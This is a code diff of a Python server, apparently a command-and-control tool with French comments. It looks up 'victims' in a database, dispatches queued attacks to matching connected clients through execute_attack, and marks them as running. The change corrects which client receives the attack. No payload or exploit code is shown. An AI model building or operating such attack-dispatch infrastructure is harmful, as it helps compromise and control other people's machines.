@@ -204,33 +204,34 @@ def start_server(port, logger):
 
             mycursor.execute(query, values)
 
-            victims = mycursor.fetchall()
+            victim_uid = mycursor.fetchall()[0]
 
-            for victim in victims:
-                victim_uid = victim[0]
+            # Vérification qu'on récupère un uid
+            if victim_uid :
                 for client in clients:
-                    if is_attacking(mycursor, victim_uid):
-                        print("[!] delaying attack, client is already attacking")
-                        logger.info("attaque retardée, la victime est déjà attaquée")
+                    if client['uid'] == victim_uid:
+                        if is_attacking(mycursor, victim_uid):
+                            print("[!] delaying attack, client is already attacking")
+                            logger.info("attaque retardée, la victime est déjà attaquée")
 
-                    else :
-                        print("[+] executing victim attack :")
-                        print("\t[+]", str(attack[2]))
-                        logger.info("lancement de l'attaque : " + str(attack) +" sur la victime : " + str(victim_uid))
-                        
-                        try:
-                            execute_attack(client, attack, logger)
+                        else :
+                            print("[+] executing victim attack :")
+                            print("\t[+]", str(attack[2]))
                             logger.info("lancement de l'attaque : " + str(attack) +" sur la victime : " + str(victim_uid))
-                        except Exception as e:
-                            logger.error("erreur lors de l'envoi de l'attaque : " + str(attack) +" sur la victime : " + str(victim_uid) + " : " + str(e))
+                            
+                            try:
+                                execute_attack(client, attack, logger)
+                                logger.info("lancement de l'attaque : " + str(attack) +" sur la victime : " + str(victim_uid))
+                            except Exception as e:
+                                logger.error("erreur lors de l'envoi de l'attaque : " + str(attack) +" sur la victime : " + str(victim_uid) + " : " + str(e))
 
-                        # Mise à jour de l'attaque
-                        query = "UPDATE victim_attacks SET state = 'running' WHERE id = %s"
-                        values = (attack[0], )
+                            # Mise à jour de l'attaque
+                            query = "UPDATE victim_attacks SET state = 'running' WHERE id = %s"
+                            values = (attack[0], )
 
-                        mycursor.execute(query, values)
+                            mycursor.execute(query, values)
 
-                        db.commit()
+                            db.commit()
             
         #######################
 
